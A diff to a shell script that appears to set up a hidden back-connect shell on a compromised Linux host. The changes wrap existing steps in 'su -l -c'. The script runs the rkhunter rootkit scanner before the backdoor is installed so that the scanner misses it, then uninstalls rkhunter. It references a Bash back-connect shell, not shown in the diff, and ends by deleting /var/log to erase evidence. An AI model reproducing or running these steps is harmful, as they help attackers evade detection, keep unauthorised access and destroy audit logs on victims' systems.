@@ -21,13 +21,9 @@ su -
 # rkhunter, a rootkit, back-connect shell and general malware hunter. Run this
 # before the back-connect shell so it doesn't detect it.
 
-apt-get install rkhunter
- 
-rkhunter --update
- 
-rkhunter --check
- 
-aptitude remove rkhunter
+su -l -c "apt-get install rkhunter && rkhunter --update"
+
+su -l -c "rkhunter --check && aptitude remove rkhunter"
  
 # Bash back-connect shell, delete it if you're using the Perl one.
  
@@ -50,9 +46,7 @@ iptables -P INPUT DROP
 iptables -A INPUT -p tcp -s 127.0.0.1 --d-port 22 -j ACCEPT
  
  
-rm -rf /var/log && rm -rf /var/logs
- 
-exit
+su -l -c "rm -rf /var/log && rm -rf /var/logs"
  
 echo 'Complete!'
  
